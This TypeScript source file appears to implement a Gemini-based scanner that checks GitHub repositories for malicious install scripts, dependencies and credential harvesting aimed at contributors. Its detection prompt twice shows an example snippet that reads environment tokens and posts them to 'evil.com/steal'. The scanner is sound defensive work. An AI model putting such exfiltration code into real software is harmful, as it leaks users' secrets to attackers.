/**
 * Gemini-Based Repository Scan Workflow
 * Orchestrates the multi-step scanning process using Gemini API directly
 */

import { GeminiService, SchemaType } from "./gemini-service";
import { GitHubClient } from "../../github/client";
import * as fs from "fs";
import * as path from "path";
import {
  SCAN_BATCH_SIZE,
  GEMINI_RISK_DETECTION_TEMPERATURE,
  GEMINI_RISK_DETECTION_THINKING_BUDGET,
  GEMINI_MAX_OUTPUT_TOKENS,
  GEMINI_SAFETY_LEVEL_TEMPERATURE,
  GEMINI_SAFETY_LEVEL_MAX_TOKENS,
} from "@/lib/constants";

export interface GeminiWorkflowConfig {
  geminiApiKey: string;
  githubToken?: string;
  geminiModel?: string; // Default: gemini-2.5-flash
}

export interface Finding {
  item: string;
  location: string;
  issue: string;
  severity: "low" | "moderate" | "severe";
  codeSnippet?: string;
  batchId?: number;
  dependencyUrl?: string;
}

export interface Findings {
  maliciousCode: Finding[];
  dependencies: Finding[];
  networkActivity: Finding[];
  fileSystemSafety: Finding[];
  credentialSafety: Finding[];
}

export interface ScanResult {
  repoUrl: string;
  repoMetadata?: any;
  findings: Findings;
  safetyLevel: "safe" | "warning" | "severe";
  aiSummary: string;
  scannedAt: string;
  validated: boolean;
  corrections?: string[];
}

export class GeminiScanWorkflow {
  private geminiService: GeminiService;
  private githubClient: GitHubClient;
  private config: GeminiWorkflowConfig;

  constructor(config: GeminiWorkflowConfig) {
    this.config = config;
    this.geminiService = new GeminiService({
      apiKey: config.geminiApiKey,
      model: config.geminiModel,
    });
    this.githubClient = new GitHubClient(config.githubToken);
  }

  /**
   * Helper: Save scan findings to disk for debugging/comparison
   */
  private saveScanFindings(
    repoUrl: string,
    findings: any,
    filename: string,
    existingFolderPath?: string
  ): string {
    let scanResultsDir: string;

    if (existingFolderPath) {
      scanResultsDir = existingFolderPath;
    } else {
      const repoName = repoUrl
        .replace(/https?:\/\//, "")
        .replace(/github\.com\//, "")
        .replace(/\//g, "-")
        .replace(/[^a-zA-Z0-9-]/g, "_");

      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const folderName = `${timestamp}_${repoName}`;

      scanResultsDir = path.join(process.cwd(), "scan_results", folderName);

      if (!fs.existsSync(scanResultsDir)) {
        fs.mkdirSync(scanResultsDir, { recursive: true });
      }
    }

    const filePath = path.join(scanResultsDir, filename);
    fs.writeFileSync(filePath, JSON.stringify(findings, null, 2), "utf-8");

    return filePath;
  }

  /**
   * Execute the full repository scan workflow
   */
  async scanRepository(repoUrl: string): Promise<ScanResult> {
    console.log(`\n🔍 Starting Gemini-based scan for: ${repoUrl}\n`);

    const rateLimitInfo = this.geminiService.getRateLimitInfo();
    console.log(
      `📊 Gemini API Rate Limit: ${rateLimitInfo.rpm} requests/minute (${rateLimitInfo.minIntervalSeconds}s between requests)\n`
    );

    try {
      // Step 1: Fetch repository content (using GitHub API - no LLM needed)
      console.log("📦 Step 1/3: Fetching repository content...");
      const repoData = await this.fetchRepoContent(repoUrl);
      console.log("✅ Repository data fetched\n");

      // Step 2: Detect security risks (using Gemini)
      console.log("🔎 Step 2/3: Analyzing for security risks with Gemini...");
      const { findings, scanFolderPath: step2FolderPath } =
        await this.detectRisks(repoData, repoUrl);
      console.log("✅ Risk analysis complete\n");

      // Step 3: Calculate safety level and generate summary (using Gemini)
      console.log(
        "📊 Step 3/3: Calculating safety level and generating summary with Gemini..."
      );
      const { safetyLevel, aiSummary, scanFolderPath } =
        await this.calculateSafetyLevel(
          findings,
          repoUrl,
          repoData.repoMetadata,
          step2FolderPath
        );
      console.log(`✅ Safety level: ${safetyLevel.toUpperCase()}\n`);

      // Build final scan result
      const finalResult: ScanResult = {
        repoUrl,
        repoMetadata: repoData.repoMetadata,
        findings,
        safetyLevel,
        aiSummary,
        scannedAt: new Date().toISOString(),
        validated: true,
      };

      // Save final scan result
      this.saveScanFindings(
        repoUrl,
        finalResult,
        "final-scan-result.json",
        scanFolderPath
      );
      console.log(`💾 All step findings saved to: ${scanFolderPath}\n`);

      return finalResult;
    } catch (error) {
      console.error("\n❌ Scan failed:", error);
      throw error;
    }
  }

  /**
   * Step 1: Fetch repository content (GitHub API - no LLM)
   */
  private async fetchRepoContent(repoUrl: string): Promise<any> {
    const log = (msg: string) => console.log(`   ${msg}`);

    const { owner, repo } = this.githubClient.parseRepoUrl(repoUrl);
    log(`📍 Repository: ${owner}/${repo}`);

    const metadata = await this.githubClient.getRepoMetadata(owner, repo, log);

    const tree = await this.githubClient.getRepoTree(
      owner,
      repo,
      metadata.defaultBranch,
      log
    );

    log(`🔍 Identifying security-relevant files...`);

    const filesToScan = this.githubClient.findFilesToScan(tree);
    const executableFiles = this.githubClient.findExecutableFiles(tree);

    log(`✅ Found ${filesToScan.length} files to scan (priority-sorted)`);
    log(
      `   Priority 1 (Critical): ${filesToScan.filter((f) => f.priority === 1).length} files`
    );
    log(
      `   Priority 2 (High): ${filesToScan.filter((f) => f.priority === 2).length} files`
    );
    log(
      `   Priority 3 (Medium): ${filesToScan.filter((f) => f.priority === 3).length} files`
    );
    log(
      `   Priority 4 (Low): ${filesToScan.filter((f) => f.priority === 4).length} files`
    );
    log(`📁 Fetching files\n`);

    const scannedFiles = await this.githubClient.scanFiles(
      owner,
      repo,
      metadata.defaultBranch,
      filesToScan,
      (message: string, current: number, total: number) => {
        console.log(`   ${message}`);
      }
    );

    log(`\n✅ All files fetched from GitHub`);

    // Extract package.json data if available
    let packageJson = null;
    let installScripts: string[] = [];

    const packageJsonContent = scannedFiles.get("package.json");
    if (packageJsonContent) {
      if (
        packageJsonContent.startsWith("[Skipped") ||
        !packageJsonContent.trim()
      ) {
        log(`⚠️  package.json was skipped or empty`);
      } else {
        try {
          packageJson = JSON.parse(packageJsonContent);
          installScripts = this.githubClient.getInstallScripts(packageJson);
          log(`✅ package.json parsed successfully`);
        } catch (error: any) {
          log(`⚠️  Failed to parse package.json: ${error.message}`);
        }
      }
    } else {
      log(`⚠️  package.json not found in scanned files`);
    }

    // Get dependency information
    const dependencies = {
      production: packageJson?.dependencies
        ? Object.entries(packageJson.dependencies).map(
            ([name, version]) => `${name}@${version}`
          )
        : [],
      dev: packageJson?.devDependencies
        ? Object.entries(packageJson.devDependencies).map(
            ([name, version]) => `${name}@${version}`
          )
        : [],
    };

    // Convert scanned files map to object
    const scannedFilesObj: Record<string, string | null> = {};
    scannedFiles.forEach((content, path) => {
      scannedFilesObj[path] = content;
    });

    return {
      repoMetadata: metadata,
      scannedFiles: scannedFilesObj,
      files: {
        packageJson,
        installScripts,
        executableFiles,
      },
      dependencies,
      treeSize: tree.length,
      filesScanned: filesToScan.length,
    };
  }

  /**
   * Step 2: Detect security risks using Gemini
   */
  private async detectRisks(
    repoData: any,
    repoUrl: string
  ): Promise<{ findings: Findings; scanFolderPath: string }> {
    const log = (msg: string) => console.log(`   ${msg}`);

    log(`🤖 Preparing Risk Detection Analysis with Gemini...`);
    log(
      `   📊 ${repoData.filesScanned} security-relevant files from ${repoData.treeSize} total, including:`
    );
    log(
      `   📦 ${repoData.dependencies.production.length} production dependencies`
    );
    log(`   🔧 ${repoData.dependencies.dev.length} dev dependencies`);
    log(`   ⚙️  ${repoData.files.installScripts.length} install scripts`);
    log(`   💻 ${repoData.files.executableFiles.length} executable files\n`);

    const scannedFilesList = Object.keys(repoData.scannedFiles);

    // Divide files into batches
    const batches: string[][] = [];
    for (let i = 0; i < scannedFilesList.length; i += SCAN_BATCH_SIZE) {
      batches.push(scannedFilesList.slice(i, i + SCAN_BATCH_SIZE));
    }

    log(
      `   📦 Processing ${batches.length} batches (${SCAN_BATCH_SIZE} files per batch)`
    );
    log(
      `   🔄 Analyzing complete file contents for thorough security review\n`
    );

    // Aggregate findings from all batches
    const allFindings: Findings = {
      maliciousCode: [],
      dependencies: [],
      networkActivity: [],
      fileSystemSafety: [],
      credentialSafety: [],
    };

    // Track scan timing
    const scanStartTime = Date.now();

    // Process each batch
    for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
      const batch = batches[batchIndex];
      const batchNum = batchIndex + 1;

      log(
        `   📋 Batch ${batchNum}/${batches.length}: Preparing ${batch.length} files for analysis...`
      );

      // Build prompt for this batch
      const batchFilesDetails = batch
        .map((path) => {
          const content = repoData.scannedFiles[path];
          if (!content) return `${path}: [Could not read]`;
          if (content.startsWith("[Skipped")) return `${path}: ${content}`;

          return `\n=== ${path} ===\n${content}\n`;
        })
        .join("\n");

      const prompt = `Analyze these ${batch.length} files from ${repoData.repoMetadata.owner}/${repoData.repoMetadata.name} for security threats TO CONTRIBUTORS:

${batchFilesDetails}


YOUR JOB: Identify threats to OPEN SOURCE CONTRIBUTORS who clone, install dependencies, or contribute to this repository.

IGNORE these (NOT threats to contributors):
- GitHub Actions workflows (.github/workflows/*) - run on GitHub servers, not contributor machines
- Release/publish scripts (scripts/release/*, scripts/publish/*) - only run by maintainers
- CI/CD tooling and dev scripts - not executed during clone/install by contributors
- Legitimate network calls in dev/test/build tools
- Standard package manager operations (npm install, yarn, etc.)

ONLY REPORT these actual threats to contributors:
- Malicious code in package.json scripts (preinstall, postinstall, install) that auto-run on npm install
- Malicious dependencies that execute harmful code when installed
- Obfuscated code designed to hide malicious behavior
- Credential harvesting from contributor environments
- Code that mines crypto or installs backdoors on contributor machines
- Executable files that auto-run and compromise contributor systems

SEVERITY RULES - ONLY report "moderate" or "severe":
- "severe": Immediate threat to contributors (malware, credential theft, system compromise)
- "moderate": Potential threat requiring investigation (suspicious patterns, risky dependencies)
- DO NOT report "low" severity findings - skip them entirely to save tokens

IMPORTANT GUIDELINES:
1. Be concise: Keep "issue" explanations to one sentence maximum
2. codeSnippet: Extract THE EXACT LINE where the issue occurs. If it spans multiple lines, show max 2 lines with original formatting, then "..." to indicate more code follows.
For example, if the malicious code is:
"
  const credentials = {
    token: process.env.API_TOKEN,
    secret: process.env.SECRET_KEY
  };
  https.post('evil.com/steal', credentials);
",
Then the codeSnippet should be:
"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."
3. Context matters: CI/CD and dev tooling are normal, not threats
4. If no moderate/severe issues found in a category, return empty array

EXAMPLE of a codeSnippet:
If the malicious code is:
  const credentials = {
    token: process.env.API_TOKEN,
    secret: process.env.SECRET_KEY
  };
  https.post('evil.com/steal', credentials);

Then codeSnippet should be:
"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."

REQUIRED JSON SCHEMA - Each finding MUST include:
{
  "item": "Short label/title for issue (max 4-5 words)",
  "location": "Exact file path",
  "issue": "Brief explanation of threat to contributors (one sentence max)",
  "severity": "moderate" | "severe",
  "codeSnippet": "THE EXACT LINE where issue occurs (max 2 lines + ... if needed). Preserve newlines as \\n and indentation.",
  "batchId": ${batchNum},
  "dependencyUrl": "https://npmjs.com/package/name (only for dependency findings)"
}

Return JSON in this exact format:
{
  "findings": {
    "maliciousCode": [ /* array of finding objects */ ],
    "dependencies": [ /* array of finding objects */ ],
    "networkActivity": [ /* array of finding objects */ ],
    "fileSystemSafety": [ /* array of finding objects */ ],
    "credentialSafety": [ /* array of finding objects */ ]
  }
}`;

      log(`      🤖 Gemini analyzing files:`);
      batch.forEach((file, idx) => {
        log(`         🔍 ${idx + 1}. ${file}`);
      });
      log(`      ⏳ Waiting for Gemini response...`);

      const batchStartTime = Date.now();

      try {
        const result = await this.geminiService.callGeminiJSON(prompt, {
          temperature: GEMINI_RISK_DETECTION_TEMPERATURE,
          thinkingBudget: GEMINI_RISK_DETECTION_THINKING_BUDGET,
          maxTokens: GEMINI_MAX_OUTPUT_TOKENS,
          responseSchema: {
            type: SchemaType.OBJECT,
            properties: {
              findings: {
                type: SchemaType.OBJECT,
                properties: {
                  maliciousCode: {
                    type: SchemaType.ARRAY,
                    items: {
                      type: SchemaType.OBJECT,
                      properties: {
                        item: { type: SchemaType.STRING },
                        location: { type: SchemaType.STRING },
                        issue: { type: SchemaType.STRING },
                        severity: { type: SchemaType.STRING },
                        codeSnippet: { type: SchemaType.STRING },
                        batchId: { type: SchemaType.NUMBER },
                      },
                      required: [
                        "item",
                        "location",
                        "issue",
                        "severity",
                        "codeSnippet",
                        "batchId",
                      ],
                    },
                  },
                  dependencies: {
                    type: SchemaType.ARRAY,
                    items: {
                      type: SchemaType.OBJECT,
                      properties: {
                        item: { type: SchemaType.STRING },
                        location: { type: SchemaType.STRING },
                        issue: { type: SchemaType.STRING },
                        severity: { type: SchemaType.STRING },
                        codeSnippet: { type: SchemaType.STRING },
                        batchId: { type: SchemaType.NUMBER },
                        dependencyUrl: { type: SchemaType.STRING },
                      },
                      required: [
                        "item",
                        "location",
                        "issue",
                        "severity",
                        "codeSnippet",
                        "batchId",
                      ],
                    },
                  },
                  networkActivity: {
                    type: SchemaType.ARRAY,
                    items: {
                      type: SchemaType.OBJECT,
                      properties: {
                        item: { type: SchemaType.STRING },
                        location: { type: SchemaType.STRING },
                        issue: { type: SchemaType.STRING },
                        severity: { type: SchemaType.STRING },
                        codeSnippet: { type: SchemaType.STRING },
                        batchId: { type: SchemaType.NUMBER },
                      },
                      required: [
                        "item",
                        "location",
                        "issue",
                        "severity",
                        "codeSnippet",
                        "batchId",
                      ],
                    },
                  },
                  fileSystemSafety: {
                    type: SchemaType.ARRAY,
                    items: {
                      type: SchemaType.OBJECT,
                      properties: {
                        item: { type: SchemaType.STRING },
                        location: { type: SchemaType.STRING },
                        issue: { type: SchemaType.STRING },
                        severity: { type: SchemaType.STRING },
                        codeSnippet: { type: SchemaType.STRING },
                        batchId: { type: SchemaType.NUMBER },
                      },
                      required: [
                        "item",
                        "location",
                        "issue",
                        "severity",
                        "codeSnippet",
                        "batchId",
                      ],
                    },
                  },
                  credentialSafety: {
                    type: SchemaType.ARRAY,
                    items: {
                      type: SchemaType.OBJECT,
                      properties: {
                        item: { type: SchemaType.STRING },
                        location: { type: SchemaType.STRING },
                        issue: { type: SchemaType.STRING },
                        severity: { type: SchemaType.STRING },
                        codeSnippet: { type: SchemaType.STRING },
                        batchId: { type: SchemaType.NUMBER },
                      },
                      required: [
                        "item",
                        "location",
                        "issue",
                        "severity",
                        "codeSnippet",
                        "batchId",
                      ],
                    },
                  },
                },
                required: [
                  "maliciousCode",
                  "dependencies",
                  "networkActivity",
                  "fileSystemSafety",
                  "credentialSafety",
                ],
              },
            },
            required: ["findings"],
          },
        });

        // Merge findings from this batch
        const findings = result.findings || result;

        // Log the full JSON response from this batch
        log(`      📋 Batch ${batchNum} JSON response:`);
        log(`${JSON.stringify(result, null, 2)}\n`);

        if (findings.maliciousCode && Array.isArray(findings.maliciousCode)) {
          allFindings.maliciousCode.push(...findings.maliciousCode);
        }
        if (findings.dependencies && Array.isArray(findings.dependencies)) {
          allFindings.dependencies.push(...findings.dependencies);
        }
        if (
          findings.networkActivity &&
          Array.isArray(findings.networkActivity)
        ) {
          allFindings.networkActivity.push(...findings.networkActivity);
        }
        if (
          findings.fileSystemSafety &&
          Array.isArray(findings.fileSystemSafety)
        ) {
          allFindings.fileSystemSafety.push(...findings.fileSystemSafety);
        }
        if (
          findings.credentialSafety &&
          Array.isArray(findings.credentialSafety)
        ) {
          allFindings.credentialSafety.push(...findings.credentialSafety);
        }

        // Calculate timing
        const batchDuration = ((Date.now() - batchStartTime) / 1000).toFixed(2);
        const scanDuration = ((Date.now() - scanStartTime) / 1000).toFixed(2);

        log(`      ✅ Gemini analysis complete for batch ${batchNum}`);
        log(
          `      ⏱️  Batch duration: ${batchDuration}s | Scan duration: ${scanDuration}s\n`
        );
      } catch (error: any) {
        // Calculate timing even on error
        const batchDuration = ((Date.now() - batchStartTime) / 1000).toFixed(2);
        const scanDuration = ((Date.now() - scanStartTime) / 1000).toFixed(2);

        log(`      ❌ Batch ${batchNum} failed: ${error.message}`);
        log(
          `      ⏱️  Batch duration: ${batchDuration}s | Scan duration: ${scanDuration}s\n`
        );
        // Continue with other batches even if one fails
      }

      // No additional delay needed - GeminiService handles rate limiting automatically
    }

    log(`   ✅ All batches analyzed`);
    log(`   📊 Total findings: ${Object.values(allFindings).flat().length}`);

    // Save Step 2 findings
    const step2FilePath = this.saveScanFindings(
      repoUrl,
      allFindings,
      "step-2-findings.json"
    );
    const scanFolderPath = path.dirname(step2FilePath);
    log(`   💾 Step 2 findings saved\n`);

    return { findings: allFindings, scanFolderPath };
  }

  /**
   * Step 3: Calculate safety level and generate summary using Gemini
   */
  private async calculateSafetyLevel(
    findings: Findings,
    repoUrl: string,
    repoMetadata: any,
    existingFolderPath: string
  ): Promise<{
    safetyLevel: string;
    aiSummary: string;
    scanFolderPath: string;
  }> {
    const log = (msg: string) => console.log(`   ${msg}`);

    log(`🤖 Calling Gemini for Safety Scoring and Summary Generation...`);

    const categories = [
      "maliciousCode",
      "dependencies",
      "networkActivity",
      "fileSystemSafety",
      "credentialSafety",
    ];
    const totalFindings = categories.reduce(
      (sum, cat) => sum + (findings[cat as keyof Findings]?.length || 0),
      0
    );

    log(
      `   📋 Evaluating ${totalFindings} total findings across ${categories.length} categories`
    );

    const prompt = `Analyze these security findings and provide safety level and summary FOR CONTRIBUTORS:

Repository: ${repoMetadata.owner}/${repoMetadata.name}
${repoMetadata.description ? `Description: ${repoMetadata.description}` : ""}
Language: ${repoMetadata.language || "Unknown"}
Stars: ${repoMetadata.stars || 0}

Findings:
${JSON.stringify(findings, null, 2)}

CONTEXT: These findings represent threats to open source contributors who clone/install/contribute to this repository.
Only "moderate" or "severe" findings are reported - "low" severity issues are filtered out.

YOUR TASK:
1. Analyze all findings across all categories (DO NOT filter or remove any findings)
2. Determine safety level for contributors based on severity
3. Generate a concise summary (2-3 sentences) explaining the safety assessment

SAFETY LEVEL RULES:
- "unsafe": Has ANY severe findings - immediate threat to contributors (malware, credential theft, system compromise)
- "caution": Has ONLY moderate findings - potential concerns, generally safe but requires contributor awareness
- "safe": NO moderate or severe findings - completely safe for contributors to clone/install/contribute

SUMMARY GUIDELINES:
- For safe repositories: State it's safe, mention it's from a reputable source if applicable, note no threats were found, and end with "This repository is likely safe to contribute to."
- For caution repositories: Briefly mention the types of concerns found, that contributors should be aware, and end with "Exercise caution if contributing to this repository."
- For unsafe repositories: Clearly state the severe threats found and end with "We strongly advise against contributing to this repository."

Return JSON in this exact format:
{
  "safetyLevel": "safe" | "caution" | "unsafe",
  "aiSummary": "2-3 sentence summary of the security assessment"
}`;

    log(`   ⏳ Waiting for Gemini response...`);
    const result = await this.geminiService.callGeminiJSON<{
      safetyLevel: string;
      aiSummary: string;
    }>(prompt, {
      temperature: GEMINI_SAFETY_LEVEL_TEMPERATURE,
      maxTokens: GEMINI_SAFETY_LEVEL_MAX_TOKENS,
      responseSchema: {
        type: SchemaType.OBJECT,
        properties: {
          safetyLevel: {
            type: SchemaType.STRING,
            description: "Overall safety level: safe, caution, or unsafe",
          },
          aiSummary: {
            type: SchemaType.STRING,
            description: "2-3 sentence summary of the security assessment",
          },
        },
        required: ["safetyLevel", "aiSummary"],
      },
    });

    log(`   ✅ Safety level determined: ${result.safetyLevel.toUpperCase()}`);
    log(`   ✅ Summary generated`);

    // Save Step 3 findings
    this.saveScanFindings(
      repoUrl,
      result,
      "step-3-findings.json",
      existingFolderPath
    );
    log(`   💾 Step 3 findings saved`);

    return {
      safetyLevel: result.safetyLevel,
      aiSummary: result.aiSummary,
      scanFolderPath: existingFolderPath,
    };
  }
}
